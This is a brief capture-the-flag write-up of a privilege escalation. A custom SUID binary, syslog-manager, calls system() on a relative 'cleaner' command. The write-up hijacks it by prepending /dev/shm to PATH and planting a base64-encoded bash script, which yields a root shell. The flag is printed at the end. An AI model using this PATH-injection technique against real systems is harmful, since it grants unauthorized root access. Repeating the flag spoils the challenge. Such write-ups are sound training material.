After getting shell on the box and enumeration, you will find a custom SUID binary.

```
ctfplayer@ctf-tickets-app-user-70bd894a8de0d40c-5d7fd9cc6d-gqmzs:/app$ find / -perm -4000 2>/dev/null
...[SNIP]...
/usr/bin/syslog-manager
```
You have a couple of subcommands to read and write to `/var/log/syslog.log`.

For the next step, you need to transfer the binary to your host for reversing.
TLDR: It's a simple switch case that handles which subcommand to call, and does operations on `/var/log/syslog.log`. The interesting subcommand to us is `syslog-manager clean`.
The `local_1018` buffer is used to construct a command string and then called with system. Since `cleaner` is not an actual binary on the machine, and an absolute path is not used, we can create our own `cleaner` and call `syslog-manager clean` to call `system` with our command.

To exploit, you can use a path injection so that `cleaner` resolves to your filepath. I just used a `bash -i` payload here for `cleaner`. 
```bash
ctfplayer@ctf-tickets-app-user-70bd894a8de0d40c-5d7fd9cc6d-gqmzs:/dev/shm$ export PATH="/dev/shm:$PATH"
ctfplayer@ctf-tickets-app-user-70bd894a8de0d40c-5d7fd9cc6d-gqmzs:/dev/shm$ echo IyEvYmluL2Jhc2gKCmJhc2ggLWkK | base64 -d > cleaner
ctfplayer@ctf-tickets-app-user-70bd894a8de0d40c-5d7fd9cc6d-gqmzs:/dev/shm$ chmod +x cleaner
ctfplayer@ctf-tickets-app-user-70bd894a8de0d40c-5d7fd9cc6d-gqmzs:/dev/shm$ syslog-manager clean
root
```
Flag: `brunner{sl1pp3d_p4st_s3cur17y_4nd_g0t_b4cks74g3_4cc3ss}`

Solved by: benkyou